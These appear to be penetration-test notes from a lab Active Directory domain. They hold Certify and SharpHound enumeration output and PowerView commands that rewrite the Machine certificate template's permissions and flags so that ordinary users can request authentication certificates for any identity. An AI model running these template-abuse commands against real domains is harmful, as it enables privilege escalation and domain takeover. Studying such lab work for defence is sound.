# Mythic


execute_assembly -Assembly Certify.exe -Arguments find /vulnerable



```json
   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=mythical-us,DC=vl'

[*] Listing info about the Enterprise CA 'mythical-us-DC01-CA'

    Enterprise CA Name            : mythical-us-DC01-CA
    DNS Hostname                  : dc01.mythical-us.vl
    FullName                      : dc01.mythical-us.vl\mythical-us-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=mythical-us-DC01-CA, DC=mythical-us, DC=vl
    Cert Thumbprint               : E5BD6F5410334B7AEF33FCC1E346789DBE47DE0D
    Cert Serial                   : 5BAD1342312AEE964BFC0FE29B33DB45
    Cert Start Date               : 11/25/2024 9:18:39 AM
    Cert End Date                 : 11/25/2524 9:28:38 AM
    Cert Chain                    : CN=mythical-us-DC01-CA,DC=mythical-us,DC=vl
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
      Allow  ManageCA, ManageCertificates               MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : Machine
    Schema Version                  : 1
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag           : AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519



Certify completed in 00:00:11.0017419
```


execute_assembly -Assembly SharpHound.exe -Arguments -c all,gpolocalgroup





2026-03-14T11:33:14.1013372-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
2026-03-14T11:33:14.1688362-07:00|INFORMATION|SharpHound Version: 2.9.0.0
2026-03-14T11:33:14.1688362-07:00|INFORMATION|SharpHound Common Version: 4.5.2.0
2026-03-14T11:33:14.2888371-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-03-14T11:33:14.4607124-07:00|INFORMATION|Initializing SharpHound at 11:33 AM on 3/14/2026
2026-03-14T11:33:14.5388371-07:00|INFORMATION|Resolved current domain to mythical-us.vl
2026-03-14T11:33:14.9138757-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry
2026-03-14T11:33:15.1013437-07:00|INFORMATION|Beginning LDAP search for mythical-us.vl
2026-03-14T11:33:15.1013437-07:00|INFORMATION|Collecting AdminSDHolder data for mythical-us.vl
2026-03-14T11:33:15.2732111-07:00|INFORMATION|AdminSDHolder ACL hash 7A008EE67A34A336DEB4369CEDDD255EB99ACCD9 calculated for mythical-us.vl.
2026-03-14T11:33:15.4919951-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6169625-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6169625-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6169625-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6169625-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6325864-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6325864-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6325864-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6325864-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6325864-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6482126-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6482126-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6482126-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6482126-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6482126-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6482126-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6638365-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6638365-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6638365-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6638365-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6638365-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6794618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6794618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6794618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6794618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6794618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6950875-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6950875-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6950875-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6950875-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.6950875-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:15.7107114-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:17.9763368-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:17.9763368-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:17.9763368-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:17.9763368-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:17.9919618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:17.9919618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:17.9919618-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0075869-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0075869-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0075869-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0075869-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0232123-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0232123-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0232123-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0232123-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0388367-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0388367-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:18.0544623-07:00|INFORMATION|Beginning LDAP search for mythical-us.vl Configuration NC
2026-03-14T11:33:19.3521209-07:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for MYTHICAL-US.VL
2026-03-14T11:33:20.4773430-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1105.
2026-03-14T11:33:20.4773430-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1106.
2026-03-14T11:33:20.4773430-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1107.
2026-03-14T11:33:20.4773430-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1109.
2026-03-14T11:33:20.4773430-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1108.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1110.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1114.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1113.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1115.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1116.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1117.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1119.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1120.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1122.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1121.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1123.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1125.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1124.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1127.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1126.
2026-03-14T11:33:20.5084278-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1111.
2026-03-14T11:33:20.5232120-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1118.
2026-03-14T11:33:20.5232120-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1112.
2026-03-14T11:33:20.5232120-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1132.
2026-03-14T11:33:20.5232120-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1104.
2026-03-14T11:33:20.5388363-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-1128.
2026-03-14T11:33:20.5700881-07:00|WARNING|[CommonLib LdapPropertyProcessor]Unable to collect UserAccountControl flags for S-1-5-21-614429729-4048209472-3755682007-501.
2026-03-14T11:33:20.8357110-07:00|INFORMATION|Producer has finished, closing LDAP channel
2026-03-14T11:33:20.8357110-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2026-03-14T11:33:39.4138369-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2026-03-14T11:33:39.4450879-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2026-03-14T11:33:39.5857112-07:00|INFORMATION|Status: 364 objects finished (+364 15.16667)/s -- Using 94 MB RAM
2026-03-14T11:33:39.5857112-07:00|INFORMATION|Enumeration finished in 00:00:24.5012296
2026-03-14T11:33:39.6638376-07:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.
 2 name to SID mappings.
 1 machine sid mappings.
 4 sid to domain mappings.
 0 global catalog mappings.
2026-03-14T11:33:39.6794630-07:00|INFORMATION|SharpHound Enumeration Completed at 11:33 AM on 3/14/2026! Happy Graphing!



Add-DomainObjectAcl -TargetIdentity Machine -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=mythical-us,DC=vl"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -XOR @{'mspki-certificate-name-flag'=1} -Verbose
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose


powershell Import-Module C:\_admin\PowerView.ps1; Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=mythical-us,DC=vl" -Identity Machine -Set @{'mspki-certificate-name-flag'=1} -Verbose






   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=mythical-us,DC=vl'

[*] Listing info about the Enterprise CA 'mythical-us-DC01-CA'

    Enterprise CA Name            : mythical-us-DC01-CA
    DNS Hostname                  : dc01.mythical-us.vl
    FullName                      : dc01.mythical-us.vl\mythical-us-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=mythical-us-DC01-CA, DC=mythical-us, DC=vl
    Cert Thumbprint               : E5BD6F5410334B7AEF33FCC1E346789DBE47DE0D
    Cert Serial                   : 5BAD1342312AEE964BFC0FE29B33DB45
    Cert Start Date               : 11/25/2024 9:18:39 AM
    Cert End Date                 : 11/25/2524 9:28:38 AM
    Cert Chain                    : CN=mythical-us-DC01-CA,DC=mythical-us,DC=vl
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
      Allow  ManageCA, ManageCertificates               MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : User
    Schema Version                  : 1
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Users      S-1-5-21-614429729-4048209472-3755682007-513
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : EFS
    Schema Version                  : 1
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Users      S-1-5-21-614429729-4048209472-3755682007-513
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : Administrator
    Schema Version                  : 1
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : EFSRecovery
    Schema Version                  : 1
    Validity Period                 : 5 years
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : File Recovery
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : Machine
    Schema Version                  : 1
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag           : AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Domain Users      S-1-5-21-614429729-4048209472-3755682007-513
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain Computers  S-1-5-21-614429729-4048209472-3755682007-515
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : DomainController
    Schema Version                  : 1
    Validity Period                 : 1 year
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag           : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Client Authentication, Server Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Domain ControllersS-1-5-21-614429729-4048209472-3755682007-516
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
                                      MYTHICAL-US\Enterprise Read-only Domain ControllersS-1-5-21-614429729-4048209472-3755682007-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteOwner Principals       : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteDacl Principals        : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519
        WriteProperty Principals    : MYTHICAL-US\Domain Admins     S-1-5-21-614429729-4048209472-3755682007-512
                                      MYTHICAL-US\Enterprise Admins S-1-5-21-614429729-4048209472-3755682007-519

    CA Name                         : dc01.mythical-us.vl\mythical-us-DC01-CA
    Template Name                   : WebServer
    Schema Version                  : 1
    Validity Period                 : 2 years
    Renewal Period                  : 6 weeks
    msPKI-Certificates-Name-Flag    : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag           : NONE
    Authorized Signatures Required  : 0
    pkiextendedkeyusage             : Server Authentication
    Permissions
      Enrollment Permissions
